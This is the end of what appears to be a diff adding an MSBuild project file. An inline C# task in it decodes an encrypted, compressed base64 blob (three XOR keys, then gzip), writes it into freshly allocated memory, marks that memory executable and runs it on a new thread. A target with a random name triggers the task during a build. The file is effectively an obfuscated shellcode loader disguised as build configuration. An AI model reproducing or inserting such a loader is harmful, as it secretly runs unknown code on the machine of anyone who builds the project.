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");var QqSvl=System.Convert.FromBase64String("qzm4GwrdTfoa3UrIsM8C1t7SR8CESa8mTB3ux6ZS2M0=");var Qo2Nd=System.Convert.FromBase64String("MWT35nvxKl6ongE9iTX3tOQAXg94BBqbcU1BmPy7/Tw=");var gtjNS=System.Convert.FromBase64String("dh8X1dDZlm5/Nq/h3HpvaCAsumIASPiuz8skqlFEFSA=");for(int L1=0;L1<qWdhqu.Length;L1++){qWdhqu[L1]^=QqSvl[L1%32];}for(int L1=0;L1<qWdhqu.Length;L1++){qWdhqu[L1]^=Qo2Nd[L1%32];}for(int L1=0;L1<qWdhqu.Length;L1++){qWdhqu[L1]^=gtjNS[L1%32];}var VTzl=new System.IO.MemoryStream();using(var lziy=new System.IO.Compression.GZipStream(new System.IO.MemoryStream(qWdhqu),System.IO.Compression.CompressionMode.Decompress))lziy.CopyTo(VTzl);qWdhqu=VTzl.ToArray();var CjheV=MeGyVIe(System.IntPtr.Zero,(uint)qWdhqu.Length,0x3000u,0x04u);System.Runtime.InteropServices.Marshal.Copy(qWdhqu,0,CjheV,qWdhqu.Length);uint U24=0;fMmOpMR(CjheV,(uint)qWdhqu.Length,0x20u,out U24);uYqwzJ9(jbEguEl(System.IntPtr.Zero,0u,CjheV,System.IntPtr.Zero,0u,System.IntPtr.Zero),0xFFFFFFFFu);return true;}]]></Code>
+    </Task>
+  </UsingTask>
+  <Target Name="bX0Iq7xoOu">
+    <QNSgVh6jox />
+  </Target>
+</Project>
